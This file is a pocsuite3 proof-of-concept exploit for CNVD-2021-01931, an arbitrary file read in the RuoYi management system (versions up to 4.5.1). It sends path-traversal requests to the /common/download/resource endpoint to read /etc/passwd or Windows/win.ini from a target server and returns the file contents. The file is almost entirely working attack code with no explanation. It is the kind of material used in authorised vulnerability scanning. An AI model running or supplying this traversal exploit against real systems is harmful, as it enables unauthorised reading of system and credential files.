#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from urllib.parse import urljoin
import platform
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)

minimum_version_required('2.0.2')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2021'
    createDate = '2023-02-07'
    updateDate = '2023-02-07'
    references = ['https://disk.scan.cm/All_wiki/%E4%BD%A9%E5%A5%87PeiQi-WIKI-POC-2021-7-20%E6%BC%8F%E6%B4%9E%E5%BA%93/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20CNVD-2021-01931.md?hash=zE0KEPGJ']
    name = 'ruoyi_file_inclusion(CNVD-2021-01931)'
    appPowerLink = 'http://doc.ruoyi.vip/'
    appName = 'ruoyi management system'
    appVersion = '<=4.5.1'
    vulType = 'Arbitrary File Read'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''


    def readfile(self):
        ostype=platform.platform()
        path_list=["/common/download/resource?resource=/profile/../../../../../../../../../../../Windows/win.ini","/common/download/resource?resource=/profile/../../../../../../../../../../../etc/passwd"]
        for path in path_list:
            resp=requests.get(url=urljoin(self.url,path))
            if "bit app support" in resp.text and "fonts" in resp.text:
                return resp.content
            elif  "root:" in resp.text and ":0:0" in resp.text:
                return resp.text

        

    def _exploit(self, param=''):
        return self._verify()

    def _verify(self):
        result = {}
        res = self.readfile()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['filecontent'] = '\n'+res
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
